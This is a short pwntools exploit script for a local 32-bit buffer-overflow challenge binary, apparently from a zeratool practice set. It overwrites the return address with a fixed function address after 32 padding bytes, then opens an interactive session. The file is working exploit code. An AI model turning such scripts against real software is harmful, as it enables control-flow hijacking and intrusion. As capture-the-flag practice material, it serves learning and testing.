from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/bof_win_32")
pwn.gdb.attach(p)
p.recvuntil(b'pwn_me:\nYour buffer is at 0x7ffefefc\n')
payload = b"\x00" * 32
payload += p32(0x80491c6)
payload += b"\n"
p.send(payload)
p.interactive()
